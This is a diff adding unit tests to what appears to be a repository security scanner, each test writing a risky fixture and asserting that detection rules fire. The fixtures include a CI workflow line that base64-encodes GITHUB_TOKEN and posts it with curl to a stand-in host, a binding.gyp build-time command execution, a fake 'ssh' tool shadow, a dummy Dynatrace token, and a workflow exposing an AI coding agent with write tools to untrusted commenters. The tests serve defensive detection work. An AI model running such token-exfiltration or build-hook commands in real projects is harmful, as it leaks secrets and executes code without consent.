@@ -294,6 +294,116 @@ class ScannerTests(unittest.TestCase):
         ids = {finding.rule_id for finding in report.findings}
         self.assertNotIn("inventory.npm_lifecycle_script", ids)
 
+    def test_flags_ci_token_and_encoded_shell_surfaces(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            workflow_dir = root / ".github" / "workflows"
+            workflow_dir.mkdir(parents=True)
+            (workflow_dir / "build.yml").write_text(
+                "name: build\n"
+                "on:\n"
+                "  issues:\n"
+                "    types: [opened]\n"
+                "jobs:\n"
+                "  run:\n"
+                "    permissions:\n"
+                "      contents: write\n"
+                "      id-token: write\n"
+                "    steps:\n"
+                "      - run: echo $GITHUB_TOKEN | base64 | curl -X POST https://example.invalid --data-binary @-\n",
+                encoding="utf-8",
+            )
+
+            report = scan_path(root)
+
+        ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("ci.workflow_surface", ids)
+        self.assertIn("ci.workflow_token_surface", ids)
+        self.assertIn("ci.workflow_encoded_exec", ids)
+        self.assertIn("ci.workflow_untrusted_write_surface", ids)
+
+    def test_flags_claude_code_action_risky_workflow_surface(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            workflow_dir = root / ".github" / "workflows"
+            workflow_dir.mkdir(parents=True)
+            (workflow_dir / "claude.yml").write_text(
+                "on:\n"
+                "  issue_comment:\n"
+                "jobs:\n"
+                "  triage:\n"
+                "    permissions:\n"
+                "      issues: write\n"
+                "      id-token: write\n"
+                "    steps:\n"
+                "      - uses: anthropics/claude-code-action@v1\n"
+                "        with:\n"
+                "          allowed_non_write_users: \"*\"\n"
+                "          claude_args: --allowedTools mcp__github__get_issue,mcp__github__update_issue\n",
+                encoding="utf-8",
+            )
+
+            report = scan_path(root)
+
+        ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("ci.claude_code_action_surface", ids)
+        self.assertIn("ci.claude_code_action_untrusted_users", ids)
+        self.assertIn("ci.claude_code_action_github_mcp_write_surface", ids)
+
+    def test_flags_binding_gyp_command_expansion(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "binding.gyp").write_text(
+                '{ "targets": [{ "target_name": "setup", "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"] }] }\n',
+                encoding="utf-8",
+            )
+
+            report = scan_path(root)
+
+        ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("node.binding_gyp_command_execution", ids)
+
+    def test_flags_composer_plugin_capability(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "composer.lock").write_text(
+                '{ "packages": [{ "name": "example/plugin", "version": "1.0.0", "type": "composer-plugin", "require": { "composer-plugin-api": "^2.0" }, "extra": { "class": "Example\\\\Plugin" } }] }\n',
+                encoding="utf-8",
+            )
+
+            report = scan_path(root)
+
+        ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("composer.plugin_capability", ids)
+
+    def test_flags_repo_local_tool_shadowing(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            tool_dir = root / "tools"
+            tool_dir.mkdir()
+            (tool_dir / "ssh").write_text("#!/usr/bin/env bash\necho fake\n", encoding="utf-8")
+
+            report = scan_path(root)
+
+        ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("inventory.tool_shadowing_candidate", ids)
+
+    def test_flags_dynatrace_token_shape_and_service_terms(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "incident.log").write_text(
+                "token=dt0c01.ABCDEFGHIJKLMNOPQRSTUVWX." + ("A" * 64) + "\n"
+                "service=dynatrace.security.operations repo=prod-dtappghrunner\n",
+                encoding="utf-8",
+            )
+
+            report = scan_path(root)
+
+        ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("exposure.dynatrace_token_shape", ids)
+        self.assertIn("exposure.dynatrace_teampcp_service_term", ids)
+        self.assertIn("exposure.dynatrace_teampcp_repo_term", ids)
+
     def test_flags_python_import_time_hook_surfaces_at_repo_root(self):
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
